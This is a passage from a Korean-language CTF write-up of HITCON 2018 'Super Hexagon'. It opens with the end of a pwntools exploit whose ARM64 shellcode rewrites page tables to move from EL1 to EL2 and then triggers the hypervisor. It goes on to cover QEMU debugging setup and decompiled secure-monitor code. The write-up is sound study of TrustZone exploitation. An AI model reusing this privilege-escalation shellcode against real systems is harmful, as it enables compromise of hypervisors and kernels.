</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry_user)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(user_val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11] // IPA 0x0000000000002000 RW
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(EL2_TEXT)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>(EL2_shellcode_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x12, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>len(EL2_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // trigger!!!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(EL1_shellcode)
</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040000000036483</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0 // IPA 0x36000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5 // r-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // IPA 0x37000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // now we can modify the kernel page table
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub x11, x11, #0xa0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x123
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> EL2_shellcode
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(EL1_shellcode)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># AP 01 -&gt; EL0 RW EL1 RW </span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="exploring-the-secure-world">Exploring the Secure world<a hidden class="anchor" aria-hidden="true" href="#exploring-the-secure-world">#</a></h1>
<p>Normal world의 최고 exception level까진 도달했다.
non-secure physical memory의 모든 부분이 제어 가능하다.
이제 secure world로 넘어가야한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/00cdfe972dd80aebcd7650dc35aea770.png" alt=""  />

전에 arm trustzone 관련해서 메뉴얼을 정리하면서 어떻게 trustzone이 메모리 격리를 유지하는지에 대해서 설명했었다.
간단하게 리마인드하자면 ARM CPU는 NS 비트를 하드웨어적으로 지원해서 메모리 격리를 유지하고 캐시 라인에서도 NS를 추가하면 따로 tlb flush도 안해도 되는식으로 구현을 했다.
ARM CPU는 SMMU를 통해 Non-secure world에서의 장치 액세스를 막아서 실질적으로 Secure world도 점거해야 중요한 장치를 공격할 수 있다.</p>
<p>그리고 분석을 더 해보니까 S-EL3는 flash에서 돌아서 수정 불가능한 메모리로써 MMIO 방식으로 동작한다.
사실 실행되는 코드도 적어서 flash로 올려서 돌리는것도 코드 무결성을 보장하는데 되게 현명한 방법이라는 생각이 들었다.</p>
<h2 id="debugging-the-secure-world">Debugging the Secure world<a hidden class="anchor" aria-hidden="true" href="#debugging-the-secure-world">#</a></h2>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/e1c8aa4c9a7a3a73fd4680cedd07aafb.png" alt=""  />

qemu에서 32bit 디버깅을 지원하지 않는다.
그래서 직접 빌드했다.
github에서 v3.0.0 checkout해서 빌드하려 했더니 오류나길래 직접 공식 사이트에서 소스 코드를 받아서 빌드했다</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>wget https://download.qemu.org/qemu-3.0.0.tar.xz
</span></span><span style="display:flex;"><span>tar -xvf ./qemu-3.0.0.tar.xz
</span></span><span style="display:flex;"><span>cd qemu-3.0.0
</span></span><span style="display:flex;"><span>./configure --target-list<span style="color:#f92672">=</span>aarch64-softmmu --disable-werror
</span></span><span style="display:flex;"><span>make -j <span style="color:#ae81ff">4</span>
</span></span></code></pre></div><p>egl-helpers.h에 <code>#include &lt;X11/Xlib.h&gt;</code>를 넣어주고 빌드했다.
static 빌드하고 싶었는데 xkbcommon 때문에 계속 실패해서 그냥 했다.</p>
<p>빌드한거 옮겨서 세팅했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex;"><span>/home/super_hexagon/qemu-system-aarch64_debug_arm32 -nographic -machine hitcon -cpu hitcon -bios /home/super_hexagon/bios.bin -monitor /dev/null 2&gt;/dev/null -serial stdio -s 
</span></span></code></pre></div><p>화면이 프린트 안돼서 serial에 stdio 줘봤더니 잘 프린트된다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/ecc4672a43444ca18696c0f270cdff4f.png" alt=""  />

디버거도 ARM32로 잘 잡힌다.</p>
<h2 id="analyzing-the-secure-monitor">Analyzing the secure monitor<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-secure-monitor">#</a></h2>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/5bb559ad0ea51c84f204aab094892d6a.png" alt=""  />

이제 secure memory를 직접 봐야하기 때문에 로컬에서 디버깅을 시작했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./local_debug.sh&#39;</span>)
</span></span></code></pre></div><p>그냥 전에 익스플로잇 코드에서 이렇게 바꿔주면 전에 미리 만들어뒀던 gdbscript로 secure memory를 볼 수 있다.
secure world 전환 이전에 secure memory를 볼일이 종종 있어서 로컬이 제일 편하다.</p>
<p>부팅 과정에서 가장 높은 exception level로 부팅을 시도하기에 전에 분석했었던 S-EL3의 부트로더부분으로 돌아가야한다.
거기서 VBAR_EL3가 0x2000인 것을 얻을 수 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/9814c10d84dabf9c854bf4b176a9677a.png" alt=""  />

일단 EL2에서 S-EL3를 바로 공격하는게 가능한지 확인해봤다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FUN_00000330</span>(uint x0,<span style="color:#66d9ef">long</span> x1,undefined8 <span style="color:#ae81ff">2</span>,undefined8 x3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>plVar2;
</span></span><span style="display:flex;"><span>  ulong in_x7;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_00000254</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((in_x7 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x83000002</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000007</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_00000ad0</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_0000089c</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_00000aec</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_00000bb4</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>plVar2 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> plVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_00000d28</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_00000310</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_000006d0</span>(<span style="color:#f92672">&amp;</span>DAT_00001910);
</span></span><span style="display:flex;"><span>    _DAT_0e002000 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    _DAT_0e002420 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000ad0</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_0000089c</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000aec</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000bb4</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>plVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">/* save non-secure system register */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000ad0</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000001</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (_DAT_0e002000 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">FUN_0000089c</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_00000aec</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_00000bb4</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>plVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> plVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_0000025c</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_000002c8</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000b2c</span>(<span style="color:#ae81ff">0</span>,_DAT_0e002420 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x1d3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000aec</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000bb4</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002468</span>) <span style="color:#f92672">=</span> x3;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002460</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002458</span>) <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002450</span>) <span style="color:#f92672">=</span> (ulong)x0;
</span></span><span style="display:flex;"><span>    plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002450</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> plVar2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>EL3의 bootloader에서 미리 0xe000000 쪽의 메모리를 0으로 밀었었다.
FUN_00000ad0는 다음과 같이 기존 non-secure system register를 특정 secure memory의 주소 + 0x130에 저장한다.
이는 아마 gerneral purpose register까지 저장하기에 그런 것 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_00000dec</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             FUN_00000dec                                    XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     FUN_00000ad0:<span style="color:#ae81ff">00000</span>ae0 (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>dec <span style="color:#ae81ff">09</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x9,spsr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>df0 <span style="color:#ae81ff">2</span>a  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x10 ,elr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>df4 <span style="color:#ae81ff">09</span>  <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">00</span>  a9    stp        x9,x10 ,[x0]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>df8 <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x15 ,sctlr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>dfc <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x16 ,actlr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e00</span> <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">01</span>  a9    stp        x15 ,x16 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x10</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e04</span> <span style="color:#ae81ff">51</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x17 ,cpacr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e08</span> <span style="color:#ae81ff">09</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">3</span>a  d5    mrs        x9,csselr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e0</span>c <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">02</span>  a9    stp        x17 ,x9,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x20</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e10</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">3</span>c  d5    mrs        x10 ,sp_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e14</span> <span style="color:#ae81ff">0</span>b  <span style="color:#ae81ff">52</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x11 ,esr_el1
